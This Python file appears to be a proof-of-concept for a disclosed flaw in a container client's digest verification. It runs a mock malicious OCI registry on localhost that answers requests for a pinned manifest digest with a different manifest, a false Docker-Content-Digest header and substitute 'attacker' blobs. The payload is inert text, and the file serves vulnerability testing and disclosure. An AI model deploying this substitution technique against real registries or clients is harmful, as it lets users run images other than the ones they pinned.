#!/usr/bin/env python3
"""
mock_registry.py -- a minimal malicious/compromised OCI registry.

Demonstrates OE1107240405872: manifest content is never verified against
its requested digest. This server:

  1. Computes the SHA256 of a LEGITIMATE-looking manifest
     (EXPECTED_MANIFEST_BYTES) -- this is the digest a caller would pin,
     e.g. `container pull registry/name@sha256:<this>`.
  2. On every request for that exact digest (both the HEAD used by
     RegistryClient.resolve() and the GET used by RegistryClient.fetch()),
     returns a COMPLETELY DIFFERENT manifest body (SUBSTITUTED_MANIFEST_BYTES)
     referencing attacker-chosen layer/config blobs instead.
  3. Serves those attacker blobs correctly (self-consistent, correctly
     hashing) at /v2/{name}/blobs/{digest} -- blob-level verification is
     enforced by the real client, so the substituted blobs must be
     legitimate content at their own claimed digests. The vulnerability is
     entirely about which manifest gets accepted, not about breaking blob
     hashing.

Run: python3 mock_registry.py <port>
Prints EXPECTED_DIGEST (the value to pin/request) to stdout on startup.
"""
import hashlib
import http.server
import json
import socketserver
import sys
import threading


class FastBindHTTPServer(http.server.HTTPServer):
    """HTTPServer, but without the slow socket.getfqdn() reverse-DNS lookup
    that HTTPServer.server_bind() normally performs on every startup. That
    lookup can hang for many seconds (sometimes far longer) on sandboxed or
    network-restricted hosts -- e.g. CI runners -- even though this server
    only ever binds to 127.0.0.1 and has no need to resolve a hostname at
    all. Symptom without this fix: the process is alive (visible in `ps`)
    but produces no output for a long time, because it's blocked inside
    server_bind() before ever reaching the print() calls in main()."""

    def server_bind(self):
        socketserver.TCPServer.server_bind(self)
        host, port = self.server_address[:2]
        self.server_name = host
        self.server_port = port


def sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def digest_of(data: bytes) -> str:
    return "sha256:" + sha256_hex(data)


# ---------------------------------------------------------------------------
# The manifest a caller believes they are pinning by digest.
# (Its bytes are never actually served by this malicious registry -- that's
# the point. Its digest is what gets requested; a legitimate registry would
# serve exactly these bytes back for that digest.)
# ---------------------------------------------------------------------------
EXPECTED_MANIFEST_BYTES = json.dumps(
    {
        "schemaVersion": 2,
        "mediaType": "application/vnd.oci.image.manifest.v1+json",
        "config": {
            "mediaType": "application/vnd.oci.image.config.v1+json",
            "digest": "sha256:" + "0" * 64,  # placeholder -- never actually fetched
            "size": 2,
        },
        "layers": [
            {
                "mediaType": "application/vnd.oci.image.layer.v1.tar",
                "digest": "sha256:" + "1" * 64,  # placeholder -- never actually fetched
                "size": 2,
            }
        ],
    },
    separators=(",", ":"),
).encode("utf-8")
EXPECTED_DIGEST = digest_of(EXPECTED_MANIFEST_BYTES)

# ---------------------------------------------------------------------------
# What the malicious registry actually returns for a request addressed by
# EXPECTED_DIGEST. References attacker-chosen blobs below.
# ---------------------------------------------------------------------------
ATTACKER_LAYER_BYTES = b"ATTACKER-CONTROLLED LAYER CONTENT -- substituted via manifest, not blob"
ATTACKER_LAYER_DIGEST = digest_of(ATTACKER_LAYER_BYTES)

ATTACKER_CONFIG_BYTES = json.dumps(
    {
        "architecture": "arm64",
        "os": "linux",
        "rootfs": {"type": "layers", "diff_ids": [ATTACKER_LAYER_DIGEST]},
        "attacker": "this is not the image you pinned",
    },
    separators=(",", ":"),
).encode("utf-8")
ATTACKER_CONFIG_DIGEST = digest_of(ATTACKER_CONFIG_BYTES)

SUBSTITUTED_MANIFEST_BYTES = json.dumps(
    {
        "schemaVersion": 2,
        "mediaType": "application/vnd.oci.image.manifest.v1+json",
        "config": {
            "mediaType": "application/vnd.oci.image.config.v1+json",
            "digest": ATTACKER_CONFIG_DIGEST,
            "size": len(ATTACKER_CONFIG_BYTES),
        },
        "layers": [
            {
                "mediaType": "application/vnd.oci.image.layer.v1.tar",
                "digest": ATTACKER_LAYER_DIGEST,
                "size": len(ATTACKER_LAYER_BYTES),
            }
        ],
    },
    separators=(",", ":"),
).encode("utf-8")
SUBSTITUTED_DIGEST = digest_of(SUBSTITUTED_MANIFEST_BYTES)

BLOBS = {
    ATTACKER_CONFIG_DIGEST: ATTACKER_CONFIG_BYTES,
    ATTACKER_LAYER_DIGEST: ATTACKER_LAYER_BYTES,
}

MEDIA_TYPE = "application/vnd.oci.image.manifest.v1+json"


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        sys.stderr.write("[mock_registry] " + (fmt % args) + "\n")

    def _manifest_ref(self, path_parts):
        # /v2/{name...}/manifests/{ref}
        idx = path_parts.index("manifests")
        name = "/".join(path_parts[1:idx])
        ref = path_parts[idx + 1]
        return name, ref

    def _blob_digest(self, path_parts):
        idx = path_parts.index("blobs")
        digest = path_parts[idx + 1]
        return digest

    def do_HEAD(self):
        parts = self.path.strip("/").split("/")
        if "manifests" in parts:
            name, ref = self._manifest_ref(parts)
            # Full attack simulation: report Docker-Content-Digest as the
            # SUBSTITUTED digest UNCONDITIONALLY, regardless of what digest
            # was actually requested/pinned (ref). This is the second half
            # of OE1107240405872's finding: resolve() never cross-checks
            # the header it receives against what the caller actually
            # asked for. A prior version of this script made HEAD "honest"
            # (echoing back the requested ref), which accidentally avoided
            # exercising this exact gap -- fixed now.
            sys.stderr.write(f"[mock_registry] HEAD manifest requested-ref={ref} -> "
                              f"reporting Docker-Content-Digest={SUBSTITUTED_DIGEST} "
                              f"(does NOT match what was requested)\n")
            self.send_response(200)
            self.send_header("Docker-Content-Digest", SUBSTITUTED_DIGEST)
            self.send_header("Content-Type", MEDIA_TYPE)
            self.send_header("Content-Length", str(len(SUBSTITUTED_MANIFEST_BYTES)))
            self.end_headers()
            return
        self.send_response(404)
        self.end_headers()

    def do_GET(self):
        parts = self.path.strip("/").split("/")
        if parts[0] == "v2" and len(parts) == 2 and parts[1] == "":
            self.send_response(200)
            self.end_headers()
            return
        if "manifests" in parts:
            name, ref = self._manifest_ref(parts)
            # Serve the substituted body regardless of which digest was
            # requested -- covers both a direct fetch by the originally
            # pinned digest (EXPECTED_DIGEST) and a fetch by whatever
            # digest resolve() was redirected to (SUBSTITUTED_DIGEST).
            sys.stderr.write(f"[mock_registry] GET manifest ref={ref} -> serving SUBSTITUTED body "
                              f"(actual digest {SUBSTITUTED_DIGEST}), regardless of requested digest\n")
            body = SUBSTITUTED_MANIFEST_BYTES
            self.send_response(200)
            self.send_header("Content-Type", MEDIA_TYPE)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if "blobs" in parts:
            digest = self._blob_digest(parts)
            body = BLOBS.get(digest)
            if body is None:
                self.send_response(404)
                self.end_headers()
                return
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self.send_response(404)
        self.end_headers()


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 0
    print(f"STARTING mock_registry.py, binding to 127.0.0.1:{port} ...")
    sys.stdout.flush()
    server = FastBindHTTPServer(("127.0.0.1", port), Handler)
    actual_port = server.server_address[1]
    print(f"BOUND. server_name resolved to: {server.server_name}")
    print(f"MOCK_REGISTRY_PORT={actual_port}")
    print(f"EXPECTED_DIGEST={EXPECTED_DIGEST}")
    print(f"SUBSTITUTED_DIGEST={SUBSTITUTED_DIGEST}")
    print(f"ATTACKER_CONFIG_DIGEST={ATTACKER_CONFIG_DIGEST}")
    print(f"ATTACKER_LAYER_DIGEST={ATTACKER_LAYER_DIGEST}")
    sys.stdout.flush()
    server.serve_forever()


if __name__ == "__main__":
    main()
